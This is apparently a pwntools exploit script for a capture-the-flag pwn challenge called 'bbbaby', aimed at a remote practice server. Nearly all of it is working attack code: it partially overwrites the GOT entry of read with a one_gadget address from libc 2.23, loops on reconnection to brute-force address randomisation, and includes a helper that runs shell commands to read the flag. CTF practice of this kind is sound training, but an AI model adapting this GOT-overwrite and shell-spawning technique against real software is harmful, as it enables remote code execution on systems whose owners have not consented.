# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './bbbaby'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    # libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28448'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice\n',num)

def stack(size , payload):
    cmd(1)
    sla('size:' , size)
    sla('content:' , payload)

    
def write_got(address ,content ):
    cmd(0)
    sla('address:',address)
    sa('content:',content)

one_gad = one_gadget(libc.path)

def attack():
    
    read_got = elf.got['read']
    atoi_got = elf.got['atoi']
    puts_plt = elf.plt['puts']

    puts_addr = libc.sym['puts']
    atoi_addr = libc.sym['atoi']
    exit_addr = libc.sym['exit']
    read_addr = libc.sym['read']

    lg('puts_addr',puts_addr)
    lg('atoi_addr',atoi_addr)
    lg('exit_addr',exit_addr)
    lg('read_addr',read_addr)

    lg('one_gad', one_gad[0])
    lg('one_gad', one_gad[1])
    lg('one_gad', one_gad[2])
    lg('one_gad', one_gad[3])
    # dbg('*0x0000000004008A1')

    # dbg('*0x0000000004008B8')
    write_got( read_got , p16(one_gad[2]&0xffff))

    # dbg()
    # p.shutdown_raw('send')

    # dbg()

    # p.success(getShell())
    p.interactive()

# attack()
exhaust(attack)

'''
@File    :   bbbaby.py
@Time    :   2021/11/07 10:40:03
@Author  :   Niyah 
'''